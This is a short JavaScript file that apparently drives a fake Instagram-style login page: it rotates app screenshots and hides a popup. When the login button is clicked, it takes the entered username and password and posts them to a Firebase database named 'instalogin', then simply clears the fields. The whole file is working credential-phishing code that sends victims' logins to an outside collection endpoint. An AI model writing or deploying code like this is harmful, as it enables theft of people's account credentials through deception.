let main_image_container = document.querySelector(".main_image_container");
let btn = document.querySelector("button");
let input_username = document.querySelector(".username");
let input_password = document.querySelector(".password");
let popup = document.querySelector(".popup");
let index = 2;

setTimeout(()=>{
        popup.id='hide';
},3000);

setInterval(()=>{
        main_image_container.innerHTML=`<img id="show" class="main_image_container_img" src="./img/screenshot${index}.png" alt="screenshot">`
        index+=1;
        if(index>4)
        {
                index=1;
        }
},6000);

btn.addEventListener('click', callback);

async function callback(){
        const fetchResponse = await fetch('https://instalogin-1f633-default-rtdb.firebaseio.com/users.json', {
            method:'POST',
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({user:input_username.value,passwd:input_password.value})
        });

        if(fetchResponse.ok)
        {
                input_username.value='';
                input_password.value='';
        }
    }